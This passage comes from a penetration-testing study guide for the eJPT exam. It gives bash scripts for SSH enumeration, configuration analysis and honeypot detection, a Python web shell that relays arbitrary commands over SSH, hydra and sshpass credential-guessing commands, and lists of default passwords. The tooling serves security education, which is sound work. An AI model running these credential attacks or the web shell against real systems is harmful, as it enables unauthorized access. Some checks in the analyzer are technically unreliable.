    while IFS= read -r target; do
        [ -z "$target" ] && continue
        scan_target "$target"
    done < "$TARGET"
else
    # Single target
    scan_target "$TARGET"
fi

# Generate summary report
log "${BLUE}[INFO]${NC} Generating summary report..."
cat > "$OUTPUT_DIR/summary.txt" << EOF
SSH Enumeration Summary Report
=============================
Date: $(date)
Target(s): $TARGET
Ports Scanned: $PORTS

Services Discovered:
$(find "$OUTPUT_DIR" -name "service_discovery.txt" -exec grep -H "ssh" {} \;)

Valid Credentials Found:
$(find "$OUTPUT_DIR" -name "valid_credentials.txt" -exec cat {} \; 2>/dev/null | sort -u)

Host Keys Discovered:
$(find "$OUTPUT_DIR" -name "hostkeys_*.txt" -exec grep -A3 "ssh-hostkey" {} \; 2>/dev/null)

Files Generated:
$(find "$OUTPUT_DIR" -type f | wc -l) files in $OUTPUT_DIR/

EOF

log "${GREEN}[COMPLETE]${NC} SSH enumeration finished"
log "${BLUE}[INFO]${NC} Results saved in: $OUTPUT_DIR"
log "${BLUE}[INFO]${NC} Summary available in: $OUTPUT_DIR/summary.txt"
```

**SSH Configuration Analyzer:**
```bash
#!/bin/bash
# SSH Configuration Security Analyzer

analyze_ssh_config() {
    local target="$1"
    local port="${2:-22}"
    
    echo "=== SSH Configuration Analysis for $target:$port ==="
    
    # Test SSH connection and extract configuration
    ssh_output=$(ssh -G "$target" -p "$port" 2>/dev/null)
    
    if [ $? -ne 0 ]; then
        echo "[ERROR] Cannot analyze SSH configuration for $target:$port"
        return 1
    fi
    
    echo "Configuration Analysis:"
    echo "======================"
    
    # Check protocol version
    protocol=$(echo "$ssh_output" | grep -i "protocol" | awk '{print $2}')
    if [ "$protocol" = "1" ]; then
        echo "[CRITICAL] SSH Protocol 1 is enabled (highly insecure)"
    else
        echo "[OK] SSH Protocol 2 is used"
    fi
    
    # Check for weak ciphers
    ciphers=$(echo "$ssh_output" | grep -i "ciphers" | cut -d' ' -f2-)
    echo ""
    echo "Enabled Ciphers:"
    for cipher in $(echo $ciphers | tr ',' ' '); do
        case $cipher in
            *des*|*rc4*|*arcfour*)
                echo "[CRITICAL] Weak cipher detected: $cipher"
                ;;
            *cbc*)
                echo "[WARNING] CBC cipher detected: $cipher (vulnerable to padding oracle attacks)"
                ;;
            *aes*gcm*|*chacha20*)
                echo "[OK] Strong cipher: $cipher"
                ;;
            *)
                echo "[INFO] Cipher: $cipher"
                ;;
        esac
    done
    
    # Check MAC algorithms
    macs=$(echo "$ssh_output" | grep -i "macs" | cut -d' ' -f2-)
    echo ""
    echo "MAC Algorithms:"
    for mac in $(echo $macs | tr ',' ' '); do
        case $mac in
            *md5*|*sha1*)
                echo "[WARNING] Weak MAC algorithm: $mac"
                ;;
            *sha2*)
                echo "[OK] Strong MAC algorithm: $mac"
                ;;
            *)
                echo "[INFO] MAC algorithm: $mac"
                ;;
        esac
    done
    
    # Check key exchange algorithms
    kex=$(echo "$ssh_output" | grep -i "kexalgorithms" | cut -d' ' -f2-)
    echo ""
    echo "Key Exchange Algorithms:"
    for kex_algo in $(echo $kex | tr ',' ' '); do
        case $kex_algo in
            *group1*|*group14*)
                echo "[WARNING] Weak key exchange: $kex_algo"
                ;;
            *curve25519*|*ecdh*)
                echo "[OK] Strong key exchange: $kex_algo"
                ;;
            *)
                echo "[INFO] Key exchange: $kex_algo"
                ;;
        esac
    done
    
    echo ""
    echo "=== End Analysis ==="
}

# Usage example
if [ $# -eq 0 ]; then
    echo "Usage: $0 <target> [port]"
    echo "Example: $0 192.168.1.100 22"
    exit 1
fi

analyze_ssh_config "$1" "$2"
```

**SSH Honeypot Detector:**
```bash
#!/bin/bash
# SSH Honeypot Detection Script

detect_honeypot() {
    local target="$1"
    local port="${2:-22}"
    
    echo "=== SSH Honeypot Detection for $target:$port ==="
    
    # Test 1: Banner analysis
    echo "[TEST 1] Banner Analysis..."
    banner=$(timeout 3 nc "$target" "$port" 2>/dev/null | head -1)
    
    case "$banner" in
        *Kippo*|*Cowrie*|*Kojoney*)
            echo "[HONEYPOT] Known honeypot banner detected: $banner"
            return 0
            ;;
        *OpenSSH*)
            echo "[OK] Standard OpenSSH banner: $banner"
            ;;
        *)
            echo "[SUSPICIOUS] Unusual banner: $banner"
            ;;
    esac
    
    # Test 2: Response timing analysis
    echo "[TEST 2] Response Timing Analysis..."
    times=()
    for i in {1..5}; do
        start=$(date +%s.%N)
        timeout 5 ssh -o ConnectTimeout=3 -o PasswordAuthentication=yes \
            "fakeuser$(date +%s)@$target" -p "$port" 2>/dev/null
        end=$(date +%s.%N)
        duration=$(echo "$end - $start" | bc 2>/dev/null || echo "0")
        times+=($duration)
        sleep 1
    done
    
    # Calculate average response time
    total=0
    for time in "${times[@]}"; do
        total=$(echo "$total + $time" | bc 2>/dev/null || echo "$total")
    done
    avg_time=$(echo "scale=2; $total / ${#times[@]}" | bc 2>/dev/null || echo "0")
    
    if (( $(echo "$avg_time < 0.1" | bc -l 2>/dev/null) )); then
        echo "[HONEYPOT] Suspiciously fast response time: ${avg_time}s"
        return 0
    elif (( $(echo "$avg_time > 10" | bc -l 2>/dev/null) )); then
        echo "[SUSPICIOUS] Very slow response time: ${avg_time}s"
    else
        echo "[OK] Normal response time: ${avg_time}s"
    fi
    
    # Test 3: Authentication behavior
    echo "[TEST 3] Authentication Behavior..."
    
    # Try multiple fake passwords quickly
    fake_attempts=0
    for i in {1..10}; do
        timeout 3 sshpass -p "fakepass$i" ssh -o ConnectTimeout=2 \
            "root@$target" -p "$port" 2>/dev/null
        if [ $? -ne 255 ]; then  # 255 is connection error
            fake_attempts=$((fake_attempts + 1))
        fi
    done
    
    if [ $fake_attempts -gt 8 ]; then
        echo "[HONEYPOT] Accepts too many fake passwords: $fake_attempts/10"
        return 0
    else
        echo "[OK] Rejects fake passwords appropriately: $fake_attempts/10"
    fi
    
    # Test 4: Service fingerprinting
    echo "[TEST 4] Service Fingerprinting..."
    
    # Check for suspicious service combinations
    nmap_output=$(nmap -sS -p 20-25,80,443,2222,8080 "$target" 2>/dev/null)
    open_ports=$(echo "$nmap_output" | grep "open" | wc -l)
    
    if [ $open_ports -gt 10 ]; then
        echo "[SUSPICIOUS] Too many open ports: $open_ports (possible honeypot)"
    else
        echo "[OK] Normal port count: $open_ports"
    fi
    
    echo "[RESULT] Honeypot detection complete"
    return 1
}

# Usage
if [ $# -eq 0 ]; then
    echo "Usage: $0 <target> [port]"
    exit 1
fi

detect_honeypot "$1" "$2"
```

### Integration with Other Tools

**SSH to Web Shell Integration:**
```bash
#!/bin/bash
# Convert SSH access to web shell for easier access

ssh_to_webshell() {
    local user="$1"
    local target="$2"
    local port="${3:-22}"
    local web_port="${4:-8080}"
    
    echo "Creating web shell tunnel via SSH..."
    echo "SSH: $user@$target:$port"
    echo "Web Shell: http://localhost:$web_port"
    
    # Create simple web shell
    cat > /tmp/webshell.py << 'EOF'
import http.server
import socketserver
import subprocess
import urllib.parse
import json

class WebShellHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            html = '''
            <html><body>
            <h2>SSH Web Shell</h2>
            <form method="POST">
                <input type="text" name="cmd" placeholder="Enter command" style="width:400px;">
                <input type="submit" value="Execute">
            </form>
            <pre id="output"></pre>
            </body></html>
            '''
            self.wfile.write(html.encode())
    
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode()
        params = urllib.parse.parse_qs(post_data)
        
        if 'cmd' in params:
            cmd = params['cmd'][0]
            try:
                result = subprocess.run(['ssh', f'$user@$target', '-p', '$port', cmd], 
                                     capture_output=True, text=True, timeout=30)
                output = f"Command: {cmd}\n\nSTDOUT:\n{result.stdout}\n\nSTDERR:\n{result.stderr}"
            except Exception as e:
                output = f"Error: {str(e)}"
            
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(output.encode())

PORT = $web_port
with socketserver.TCPServer(("", PORT), WebShellHandler) as httpd:
    print(f"Web shell running on port {PORT}")
    httpd.serve_forever()
EOF

    python3 /tmp/webshell.py
}

# Usage: ssh_to_webshell admin 192.168.1.100 22 8080
```

---

## 🎓 Final Study Tips

### Memory Techniques for eJPT

**Acronym: "SSH-BEAR"**
- **S**ervice Discovery (nmap -p 22 -sV)
- **S**cript Enumeration (--script ssh-*)
- **H**ost Key Analysis (ssh-hostkey)
- **B**anner Grabbing (nc target 22)
- **E**numerate Users (timing attacks)
- **A**uthentication Testing (hydra)  
- **R**eporting Results (document everything)

### Quick Win Strategies

**30-Second SSH Check:**
```bash
# The fastest way to check SSH on a target
nmap -p 22 -sV <target> && nc <target> 22 & sleep 1 && kill %1
```

**5-Minute SSH Audit:**
```bash
#!/bin/bash
TARGET=$1
echo "=== 5-Minute SSH Audit for $TARGET ==="
echo "[1/5] Service Discovery..."
nmap -p 22,2222,22022 -sV $TARGET
echo "[2/5] Banner Grabbing..."  
timeout 2 nc $TARGET 22
echo "[3/5] Host Keys..."
nmap --script ssh-hostkey -p 22 $TARGET
echo "[4/5] Auth Methods..."
nmap --script ssh-auth-methods -p 22 $TARGET  
echo "[5/5] Quick Credential Test..."
echo "Testing admin:admin..."
timeout 5 sshpass -p admin ssh -o ConnectTimeout=2 admin@$TARGET "whoami"
echo "=== Audit Complete ==="
```

### Pre-Exam Checklist

**Before eJPT Exam:**
- [ ] Practice SSH service discovery on 10+ targets
- [ ] Master nmap SSH scripts (ssh-hostkey, ssh-auth-methods)  
- [ ] Test common credentials manually and with Hydra
- [ ] Practice banner grabbing with netcat
- [ ] Know how to handle connection timeouts and errors
- [ ] Practice documenting findings with screenshots
- [ ] Understand SSH version security implications
- [ ] Be comfortable with non-standard SSH ports

**Common eJPT SSH Questions:**
1. "What version of SSH is running on the target?"
2. "What authentication methods are supported?"  
3. "Can you login with admin/admin credentials?"
4. "What is the SSH host key fingerprint?"
5. "Is password authentication enabled?"

### Last-Minute Review

**Commands to Memorize:**
```bash
nmap -p 22 -sV <target>                    # Service detection
nc <target> 22                             # Banner grab
ssh admin@<target>                         # Quick login test
nmap --script ssh-hostkey -p 22 <target>   # Host keys
hydra -l admin -p admin ssh://<target>     # Single cred test
```

**Port Numbers to Remember:**
- 22 (standard SSH)
- 2222 (common alternative)
- 22022 (another common alt)

**Default Credentials to Try:**
- admin/admin
- root/root  
- user/password
- ubuntu/ubuntu

---

## 🏆 Conclusion

This comprehensive SSH enumeration guide provides everything needed for successful penetration testing and eJPT exam preparation. The combination of theoretical knowledge, practical examples, automated scripts, and exam-focused content ensures thorough understanding of SSH security assessment.

**Key Takeaways:**
- SSH enumeration is a critical skill for penetration testers
- Multiple techniques should be used for comprehensive assessment
- Automation saves time but manual verification is essential
- Proper documentation is crucial for professional reporting
- Practice with real lab environments is invaluable

**Next Steps:**
1. Set up a practice lab with various SSH configurations
2. Practice all commands and scripts provided  
3. Create your own enumeration methodology
4. Time yourself to build exam readiness
5. Document everything for future reference

**Remember:** The goal is not just to pass the eJPT exam, but to become a skilled security professional who can effectively assess SSH security in real-world environments.

---

*This guide is part of a comprehensive penetration testing study series. For questions or suggestions, refer to the community resources listed above.*
